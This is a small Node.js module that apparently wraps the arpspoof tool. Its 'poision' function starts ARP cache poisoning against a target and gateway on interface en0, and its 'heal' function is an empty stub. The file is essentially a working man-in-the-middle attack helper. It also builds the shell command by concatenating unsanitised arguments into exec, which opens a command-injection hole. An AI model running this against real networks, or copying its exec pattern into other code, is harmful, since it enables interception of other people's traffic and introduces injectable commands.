const exec = require('child_process').exec;

// exports.setNIC = arp.setInterface;

exports.poision = function(target, gateway){
  exec('arpspoof -i en0 -t ' + target + ' ' + gateway)
}

exports.heal = function(target, gateway){

}
